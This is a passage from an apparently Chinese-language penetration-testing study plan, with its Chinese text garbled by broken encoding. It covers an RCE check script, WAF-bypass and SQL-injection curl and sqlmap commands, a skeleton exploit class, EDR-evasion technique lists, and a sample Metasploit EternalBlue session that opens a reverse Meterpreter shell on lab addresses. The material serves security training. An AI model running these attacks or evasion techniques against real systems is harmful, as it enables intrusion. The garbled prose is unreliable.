åˆ©ç”¨æ–¹å¼: æ„é€ æ¶æ„ HTTP è¯·æ±‚
"""

VULN_INFO = {
    "cve": "CVE-2024-XXXX",
    "description": "Remote Code Execution via parameter injection",
    "cvss": 9.8,
    "exploit_type": "remote",
    "payload_template": "'; {command}; '"
}
```

2. **ç¼–å†™æ£€æµ‹è„šæœ¬**

```python
#!/usr/bin/env python3
"""
CVE-2024-XXXX RCE æ£€æµ‹è„šæœ¬
"""

import requests
import argparse

def check_vulnerability(target_url: str) -> bool:
    """æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨"""
    # æ„é€ æµ‹è¯• payload
    test_payload = "echo VULN_TEST"
    
    try:
        # å‘é€æµ‹è¯•è¯·æ±‚
        response = requests.get(
            target_url,
            params={'cmd': test_payload},
            timeout=10
        )
        
        # æ£€æŸ¥å“åº”
        if "VULN_TEST" in response.text:
            return True
            
    except Exception as e:
        print(f"Error: {e}")
    
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', required=True)
    args = parser.parse_args()
    
    if check_vulnerability(args.url):
        print(f"[+] Vulnerability confirmed on {args.url}")
    else:
        print(f"[-] No vulnerability found on {args.url}")
```

---

### ä»»åŠ¡ 3ï¼ˆå¿…åšï¼‰ï¼šç»•è¿‡å®‰å…¨é˜²æŠ¤æµ‹è¯•

**ç›®æ ‡**ï¼šæµ‹è¯• WAF ç»•è¿‡æŠ€æœ¯å’Œç¼–ç æ–¹æ³•ã€‚

**æ­¥éª¤**ï¼š

1. **WAF æŒ‡çº¹è¯†åˆ«**

```bash
# ä½¿ç”¨ WAFW00F
wafw00f http://10.0.0.10

# ä½¿ç”¨ whatwaf
whatwaf -u http://10.0.0.10

# æ‰‹åŠ¨æµ‹è¯•
curl -v http://10.0.0.10
```

2. **ç¼–ç ç»•è¿‡æµ‹è¯•**

```bash
# URL ç¼–ç 
curl "http://10.0.0.10/page?id=1%27%20OR%20%271%27=%271"

# Base64 ç¼–ç 
echo "SELECT * FROM users" | base64

# Unicode ç¼–ç 
# åœ¨ SQL æ³¨å…¥ç‚¹å°è¯•
```

3. **ä½¿ç”¨ SQLMap tamper è„šæœ¬**

```bash
sqlmap -u "http://10.0.0.10/login.php" \
    --data="username=admin&password=test" \
    --tamper=space2comment,charencode,randomcase \
    --level=5 \
    --risk=3
```

---

### ä»»åŠ¡ 4ï¼ˆè¿›é˜¶ï¼‰ï¼šå¼€å‘è‡ªå®šä¹‰åˆ©ç”¨æ¨¡å—

**ç›®æ ‡**ï¼šå¼€å‘ä¸€ä¸ªè‡ªå®šä¹‰çš„æ¼æ´åˆ©ç”¨æ¨¡å—ã€‚

**æ­¥éª¤**ï¼š

```python
#!/usr/bin/env python3
"""
è‡ªå®šä¹‰æ¼æ´åˆ©ç”¨æ¨¡å—å¼€å‘
"""

import socket
import argparse
from typing import Optional


class CustomExploit:
    """è‡ªå®šä¹‰æ¼æ´åˆ©ç”¨"""
    
    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.timeout = 10
    
    def check(self) -> bool:
        """æ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨"""
        # å®ç°æ¼æ´æ£€æµ‹é€»è¾‘
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        
        try:
            sock.connect((self.target, self.port))
            # å‘é€æ¢æµ‹æ•°æ®
            sock.send(b'PING\r\n')
            response = sock.recv(1024)
            sock.close()
            
            # æ£€æŸ¥å“åº”
            return b'PONG' in response
            
        except Exception as e:
            print(f"Error: {e}")
            return False
    
    def exploit(self, command: str = "whoami") -> Optional[str]:
        """æ‰§è¡Œåˆ©ç”¨"""
        if not self.check():
            print("Target is not vulnerable")
            return None
        
        # æ„å»ºæ¶æ„ payload
        payload = self.build_payload(command)
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            
            sock.send(payload)
            response = sock.recv(4096)
            sock.close()
            
            return response.decode('utf-8', errors='ignore')
            
        except Exception as e:
            print(f"Exploit failed: {e}")
            return None
    
    def build_payload(self, command: str) -> bytes:
        """æ„å»ºåˆ©ç”¨ payload"""
        # å®ç° payload æ„å»ºé€»è¾‘
        return f"EVIL{command}\r\n".encode()


def main():
    parser = argparse.ArgumentParser(description='Custom Exploit')
    parser.add_argument('--target', required=True)
    parser.add_argument('--port', type=int, default=8080)
    parser.add_argument('--mode', choices=['check', 'exploit'], default='check')
    parser.add_argument('--cmd', default='whoami')
    
    args = parser.parse_args()
    
    exploit = CustomExploit(args.target, args.port)
    
    if args.mode == 'check':
        result = exploit.check()
        print(f"Vulnerable: {result}")
    else:
        output = exploit.exploit(args.cmd)
        print(f"Output: {output}")


if __name__ == "__main__":
    main()
```

---

## å·©å›ºç»ƒä¹ ï¼ˆé¢˜ä¸å¤ç›˜ï¼‰

---

### ç»ƒä¹  1ï¼šæ¼æ´è¯„åˆ†æ¯”è¾ƒ

**é—®é¢˜**ï¼šè®¡ç®—å¹¶æ¯”è¾ƒä¸¤ä¸ªä¸åŒæ¼æ´åœºæ™¯çš„ CVSS è¯„åˆ†ã€‚

**æ€è·¯æç¤º**ï¼š

| åœºæ™¯ | AV | AC | PR | UI | S | C | I | A | è¯„åˆ† |
|------|----|----|----|----|---|---|---|---|------|
| **åœºæ™¯1** | ç½‘ç»œ | ä½ | æ—  | æ—  | æœªæ”¹å˜ | é«˜ | é«˜ | é«˜ | 9.8 |
| **åœºæ™¯2** | ç½‘ç»œ | é«˜ | ä½ | éœ€è¦ | æ”¹å˜ | ä½ | ä½ | æ—  | 4.3 |

**ç­”æ¡ˆ**ï¼š
- åœºæ™¯1ï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰ï¼šCVSS 9.8 (Critical)
- åœºæ™¯2ï¼ˆä¿¡æ¯æ³„éœ²ï¼‰ï¼šCVSS 4.3 (Medium)

---

### ç»ƒä¹  2ï¼šç»•è¿‡æŠ€æœ¯é€‰æ‹©

**é—®é¢˜**ï¼šé’ˆå¯¹ä¸åŒçš„é˜²æŠ¤æªæ–½ï¼Œåº”è¯¥é€‰æ‹©å“ªäº›ç»•è¿‡æŠ€æœ¯ï¼Ÿ

**ç¤ºä¾‹ç­”æ¡ˆ**ï¼š

```python
# é˜²æŠ¤æªæ–½ä¸ç»•è¿‡æŠ€æœ¯æ˜ å°„
BYPASS_MAPPING = {
    "WAF (Webåº”ç”¨é˜²ç«å¢™)": [
        "Payload ç¼–ç  (Base64, URL, Hex)",
        "å¤§å°å†™å˜æ¢",
        "æ³¨é‡Šå¹²æ‰°",
        "HTTP æ–¹æ³•å˜æ¢",
        "åˆ†å—ä¼ è¾“ç¼–ç "
    ],
    "è¾“å…¥è¿‡æ»¤": [
        "å­—ç¬¦æ›¿ä»£ (å•å¼•å· â†’ åŒåå…­è¿›åˆ¶)",
        "å­—ç¬¦ä¸²æ‹¼æ¥",
        "ç¼–ç è½¬æ¢",
        "SQL æ³¨é‡Šåˆ©ç”¨"
    ],
    "ç½‘ç»œç›‘æ§": [
        "æ…¢é€Ÿæ‰«æ",
        "åˆ†ç‰‡ä¼ è¾“",
        "åè®®æ··æ·†",
        "åŠ å¯†éš§é“"
    ],
    "EDR/ç»ˆç«¯é˜²æŠ¤": [
        "è¿›ç¨‹æ³¨å…¥",
        "å†…å­˜åŠ å¯†",
        "DLL åŠ«æŒ",
        "ç³»ç»Ÿè°ƒç”¨éšè—"
    ]
}
```

---

### ç»ƒä¹  3ï¼šPoC å¼€å‘æœ€ä½³å®è·µ

**é—®é¢˜**ï¼šå¼€å‘é«˜è´¨é‡ PoC éœ€è¦æ³¨æ„å“ªäº›æ–¹é¢ï¼Ÿ

**ç¤ºä¾‹ç­”æ¡ˆ**ï¼š

```python
# PoC å¼€å‘æœ€ä½³å®è·µ
POC_BEST_PRACTICES = {
    "å¯é æ€§": [
        "å¤„ç†ç½‘ç»œè¶…æ—¶å’Œé”™è¯¯",
        "æ”¯æŒé‡è¯•æœºåˆ¶",
        "éªŒè¯æ¼æ´è§¦å‘æ¡ä»¶",
        "å…¼å®¹å¤šä¸ªç‰ˆæœ¬"
    ],
    "å®‰å…¨æ€§": [
        "ä¸é€ æˆç›®æ ‡ç³»ç»ŸæŸå",
        "å¯æ¢å¤çš„æµ‹è¯•æ“ä½œ",
        "ä¸ç•™ä¸‹åé—¨æˆ–æ¶æ„ä»£ç ",
        "æ—¥å¿—è®°å½•å’Œå®¡è®¡"
    ],
    "å¯ç§»æ¤æ€§": [
        "æ”¯æŒå¤šä¸ªæ“ä½œç³»ç»Ÿ",
        "æœ€å°ä¾èµ–",
        "æ¸…æ™°çš„æ–‡æ¡£",
        "æ ‡å‡†åŒ–çš„è¾“å‡ºæ ¼å¼"
    ],
    "å®Œæ•´æ€§": [
        "åŒ…å«æ£€æµ‹ã€åˆ©ç”¨ã€ä¿®å¤å»ºè®®",
        "æä¾›è¯æ®æ”¶é›†åŠŸèƒ½",
        "æ”¯æŒæ‰¹é‡æµ‹è¯•",
        "ç”ŸæˆæŠ¥å‘Š"
    ]
}
```

---

## è¯„ä¼°æ ‡å‡†ï¼ˆè¾¾æˆåˆ¤å®šï¼‰

- âœ… èƒ½ç†è§£ CVSS è¯„åˆ†ä½“ç³»å¹¶è®¡ç®—æ¼æ´é£é™©
- âœ… èƒ½ä½¿ç”¨ Metasploit è¿›è¡Œæ¼æ´åˆ©ç”¨
- âœ… èƒ½ç¼–å†™æ¼æ´éªŒè¯è„šæœ¬ï¼ˆPoCï¼‰
- âœ… èƒ½åº”ç”¨å¸¸è§çš„é˜²æŠ¤ç»•è¿‡æŠ€æœ¯
- âœ… èƒ½è§„èŒƒåŒ–è®°å½•æ¼æ´å¤ç°è¿‡ç¨‹

---

## å­¦ä¹ æˆæœè¾¾æˆæƒ…å†µï¼ˆç”±å­¦ä¹ è€…å¡«å†™ï¼‰

### æˆªå›¾ä¸è¯æ®

- [ ] Metasploit æ¼æ´åˆ©ç”¨æˆªå›¾
- [ ] Meterpreter shell æˆªå›¾
- [ ] PoC æµ‹è¯•ç»“æœæˆªå›¾
- [ ] ç»•è¿‡æŠ€æœ¯æµ‹è¯•æˆªå›¾

### å…³é”®å‘½ä»¤ä¸è¾“å‡º

**Metasploit åˆ©ç”¨**ï¼š
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.0.0.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.0.0.5
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.0.0.5:4444
[*] 10.0.0.10:445 - Connecting to target...
[*] Meterpreter session 1 opened
meterpreter > sysinfo
Computer        : WIN-XXXX
OS              : Windows 2019 (Build 17763)
Architecture    : x64
```

**PoC æ£€æµ‹ç»“æœ**ï¼š
```bash
$ python3 cve_2024_xxxx_poc.py --target 10.0.0.10
[+] Vulnerability confirmed on 10.0.0.10:8080
[+] CVSS Score: 9.8 (Critical)
[+] Remediation: Upgrade to version 2.2.0 or later
```

### ç»“è®ºä¸åæ€

**æˆ‘ä»Šå¤©ææ¸…æ¥šäº†**ï¼š

- æ¼æ´åˆ©ç”¨çš„å®Œæ•´æµç¨‹å’Œæ–¹æ³•è®º
- CVSS è¯„åˆ†çš„è®¡ç®—æ–¹æ³•å’Œå«ä¹‰
- Metasploit æ¡†æ¶çš„ä½¿ç”¨å’Œæ‰©å±•
- PoC å¼€å‘çš„åŸºæœ¬åŸåˆ™
- å¸¸è§çš„é˜²æŠ¤ç»•è¿‡æŠ€æœ¯

**æˆ‘å·®ç‚¹ææ··çš„æ˜¯**ï¼š

- CVSS ä¸åŒç‰ˆæœ¬çš„è¯„åˆ†å·®å¼‚
- Meterpreter å’Œ shell çš„åŒºåˆ«
- æ¼æ´æ£€æµ‹å’Œæ¼æ´åˆ©ç”¨çš„è¾¹ç•Œ

**æ˜å¤©æˆ‘è¦ç»§ç»­è¡¥çš„æ˜¯**ï¼š

- Web åº”ç”¨æ¼æ´æ·±åº¦æµ‹è¯•
- æƒé™æå‡æŠ€æœ¯
- åæ¸—é€æµ‹è¯•æ–¹æ³•

**æœ¬æ¬¡å­¦ä¹ è€—æ—¶**ï¼šçº¦ 4 å°æ—¶

**æŒæ¡ç¨‹åº¦è‡ªè¯„**ï¼š

- [ ] ğŸ˜• ç†è§£äº†åŸºæœ¬æ¦‚å¿µï¼Œä½†å®è·µä¸ç†Ÿç»ƒ
- [ ] ğŸ™‚ å®Œæˆäº†åŸºç¡€ä»»åŠ¡
- [ ] ğŸ˜ƒ å®Œæˆäº†æ‰€æœ‰ä»»åŠ¡å¹¶ç†è§£åŸç†
- [ ] ğŸ¤© é¢å¤–å¼€å‘äº†å®Œæ•´çš„è‡ªå®šä¹‰åˆ©ç”¨æ¨¡å—


## å­¦ä¹ æˆæœç¤ºä¾‹å¡«å†™ï¼ˆå¯ç…§æŠ„ï¼‰

> å¯å°†"ç¤ºä¾‹"å†…å®¹æ›¿æ¢ä¸ºä½ è‡ªå·±çš„æ—¶é—´ä¸æˆªå›¾æ–‡ä»¶åã€‚

### æˆªå›¾ä¸è¯æ®ï¼ˆç¤ºä¾‹ï¼‰

- ä»»åŠ¡ 1ï¼š`images/dayXXX_task1.png`

### å…³é”®å‘½ä»¤ä¸è¾“å‡ºï¼ˆç¤ºä¾‹ï¼‰

```
å‘½ä»¤ç¤ºä¾‹ï¼š
è¾“å‡ºç¤ºä¾‹ï¼š
```

### ç»“è®ºä¸åæ€ï¼ˆç¤ºä¾‹ï¼‰

**æˆ‘ä»Šå¤©ææ¸…æ¥šäº†**ï¼š
- ï¼ˆç¤ºä¾‹ï¼‰ç†è§£äº†æ ¸å¿ƒæ¦‚å¿µ

**æˆ‘å·®ç‚¹ææ··çš„æ˜¯**ï¼š
- ï¼ˆç¤ºä¾‹ï¼‰æŸä¸ªæ˜“æ··æ·†ç‚¹

**æ˜å¤©æˆ‘è¦ç»§ç»­è¡¥çš„æ˜¯**ï¼š
- ï¼ˆç¤ºä¾‹ï¼‰ä¸‹ä¸€æ­¥æ·±å…¥æ–¹å‘

**æœ¬æ¬¡å­¦ä¹ è€—æ—¶**ï¼šçº¦ 2 å°æ—¶

**æŒæ¡ç¨‹åº¦è‡ªè¯„**ï¼š
- [x] ğŸ˜ƒ å®Œæˆäº†æ‰€æœ‰ä»»åŠ¡å¹¶ç†è§£åŸç†
